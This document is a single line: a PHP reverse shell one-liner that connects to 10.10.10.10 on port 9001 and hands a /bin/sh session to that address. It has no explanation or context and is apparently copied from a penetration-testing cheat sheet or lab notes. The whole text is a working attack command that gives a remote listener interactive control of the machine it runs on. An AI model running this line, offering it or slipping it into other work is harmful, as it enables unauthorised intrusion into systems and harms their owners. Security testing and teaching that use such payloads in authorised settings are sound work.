php -r '$sock=fsockopen("10.10.10.10",9001);exec("/bin/sh <&3 >&3 2>&3");'
